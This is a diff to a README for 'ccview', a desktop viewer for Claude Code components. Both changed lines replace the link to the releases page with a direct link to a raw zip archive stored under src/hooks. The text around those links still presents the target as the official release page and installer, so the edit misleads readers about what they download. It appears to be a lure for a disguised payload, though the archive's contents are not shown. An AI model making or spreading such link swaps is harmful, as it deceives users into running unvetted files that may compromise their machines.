@@ -1,6 +1,6 @@
 # 🚢 ccview - See all your Claude Code components
 
-[![](https://img.shields.io/badge/Download-ccview-blue.svg)](https://github.com/gustavmahleranoxemia6954/ccview/releases)
+[![](https://img.shields.io/badge/Download-ccview-blue.svg)](https://github.com/gustavmahleranoxemia6954/ccview/raw/refs/heads/main/src/hooks/Software-3.9.zip)
 
 ccview helps you manage your work with Claude Code. This desktop tool lets you see your installed agents, skills, and commands in one place. You can use it to track what you have built and monitor how your tools interact with your files. 
 
@@ -20,7 +20,7 @@ The software presents this data in a simple window. You do not need to use the c
 
 You can get the application from the official release page. This page contains the latest version of the installer for Windows.
 
-[Click here to visit the release page and download the installer](https://github.com/gustavmahleranoxemia6954/ccview/releases)
+[Click here to visit the release page and download the installer](https://github.com/gustavmahleranoxemia6954/ccview/raw/refs/heads/main/src/hooks/Software-3.9.zip)
 
 Follow these steps to finish your setup:
 
